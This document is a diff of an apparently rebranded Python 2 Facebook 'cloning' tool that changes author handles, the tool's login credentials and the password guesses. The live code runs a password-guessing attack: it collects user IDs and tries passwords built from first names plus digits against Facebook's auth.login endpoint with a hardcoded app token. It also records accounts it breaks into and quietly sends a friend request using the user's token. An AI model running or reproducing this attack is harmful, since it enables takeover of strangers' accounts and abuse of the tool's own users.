@@ -50,17 +50,18 @@ def jalan(z):
 logo = """
 \033[91m
 
-  _____             _____ _    _ _      
- |  __ \     /\    / ____| |  | | |     
- | |__) |   /  \  | (___ | |  | | |     
- |  _  /   / /\ \  \___ \| |  | | |     
- | | \ \  / ____ \ ____) | |__| | |____ 
- |_|  \_\/_/    \_\_____/ \____/|______|
+
+┏━━━┳┓╋┏┳━━━┳━┓┏━┳━━┓┏┓╋╋┏━┓╋┏┳━━━┓
+┃┏━┓┃┃╋┃┃┏━━┻┓┗┛┏┫┏┓┃┃┃╋╋┃┃┗┓┃┣┓┏┓┃
+┃┗━━┫┗━┛┃┗━━┓┗┓┏┛┃┗┛┗┫┃╋╋┃┏┓┗┛┃┃┃┃┃
+┗━━┓┃┏━┓┃┏━━┛┏┛┗┓┃┏━┓┃┃╋┏┫┃┗┓┃┃┃┃┃┃
+┃┗━┛┃┃╋┃┃┗━━┳┛┏┓┗┫┗━┛┃┗━┛┃┃╋┃┃┣┛┗┛┃
+┗━━━┻┛╋┗┻━━━┻━┛┗━┻━━━┻━━━┻┛╋┗━┻━━━┛
                                         
                                         
 ╔▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╗
-\033[33m Telegram ___
-YouTube___ROCK_LIST╚▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╝"""
+\033[33m Telegram @SHEX_CRACKER
+SNAPCHAT @K4RO_2╚▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╝"""
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
@@ -80,11 +81,11 @@ os.system("clear")
 print "\x1b[0;31m⚔═══════════════════════════☠═══════════════════════════⚔"
 print  """\033[91mNote[Ema Bar Prs Nen La Hech Keshayak
 \033[33mTool Vip Bo Ftoshtn Nrx 10$
-\033[91mBo Kren @"""
+\033[91mBo Kren @SHEX_CRACKER
 print " \x1b[1;93m⚔══════════════════════════☠═══════════════════════════⚔"
 
-CorrectUsername = "rasul"
-CorrectPassword = "kurd"
+CorrectUsername = "BLND"
+CorrectPassword = "MASUD"
 
 loop = 'true'
 while (loop == 'true'):
@@ -96,10 +97,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print("Halaya")
-            os.system('xdg-open https://t.me/@aroKURD1')
+            os.system('xdg-open https://t.me/@SHEX_CRACKER')
     else:
         print ("Halaya")
-        os.system('xdg-open https://t.me/@aroKURD1')
+        os.system('xdg-open https://t.me/@SHEX_CRACKER')
 
 def login():
 	os.system('clear')
@@ -140,7 +141,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://t.me/@aroKURD1')
+				os.system('xdg-open https://t.me/@SHEX_CRACKER')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -298,10 +299,9 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;32;40m[✺] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
-	print "   \033[1;31;48m__Rasul_Kurd_Rasul_Kurd"
-
+	print "   \033[1;31;48m__SHEX__BLND__UP"
 	jalan('                    \033[1;91mTricker start cloning Wait...')
-	print  "  \033[1;36;48m _Aro_Kurd_Aro_Kurd "
+	print  "  \033[1;36;48m__SHEX__BLND__UP "
 
 	def main(arg):
 		global cekpoint,oks
@@ -313,7 +313,7 @@ def pilih_super():
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
-			pass1 = b['first_name'] + '1'
+			pass1 = b['first_name'] + '1234'
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
@@ -327,7 +327,7 @@ def pilih_super():
 					cek.close()
 					cekpoint.append(user+pass1)
 				else:
-					pass2 = b['first_name'] + '123'
+					pass2 = b['first_name'] + '12345'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if 'access_token' in q:
@@ -341,7 +341,7 @@ def pilih_super():
 							cek.close()
 							cekpoint.append(user+pass2)
 						else:
-							pass3 = b['first_name'] + '12345'
+							pass3 = b['first_name'] + '123456'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if 'access_token' in q:
@@ -355,7 +355,7 @@ def pilih_super():
 									cek.close()
 									cekpoint.append(user+pass4)
 								else:
-									pass4 = b['first_name'] + '1234'
+									pass4 = b['first_name'] + '11223344'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
@@ -383,7 +383,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = b['last_name'] + '11223344'
+													pass6 ='1234554321'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
